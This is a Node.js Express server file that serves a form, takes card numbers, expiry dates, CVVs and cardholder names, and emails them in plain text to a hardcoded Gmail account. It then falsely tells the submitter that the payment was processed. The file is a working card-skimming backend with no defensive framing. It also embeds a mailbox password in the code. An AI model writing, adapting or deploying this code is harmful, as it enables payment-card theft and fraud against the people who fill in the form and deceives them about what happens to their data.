const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve the HTML file
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Handle form submission
app.post('/submit', (req, res) => {
    const { cardNumber, expiryDate, cvv, cardHolderName } = req.body;

    // Create a transporter object using SMTP transport
    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'jhon.wang.lang@gmail.com', // Your email
            pass: 'theFlash12345'   // Your email password
        }
    });

    // Set up email data
    let mailOptions = {
        from: '"Credit Card Form" <jhon.wang.lang@gmail.com>', // Sender address
        to: 'jhon.wang.lang@gmail.com', // List of receivers
        subject: 'New Credit Card Information', // Subject line
        text: `Card Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}\nCard Holder Name: ${cardHolderName}` // Plain text body
    };

    // Send mail with defined transport object
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return console.log(error);
        }
        console.log('Message sent: %s', info.messageId);
    });

    res.json({ message: 'Payment was successfully processed' });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});
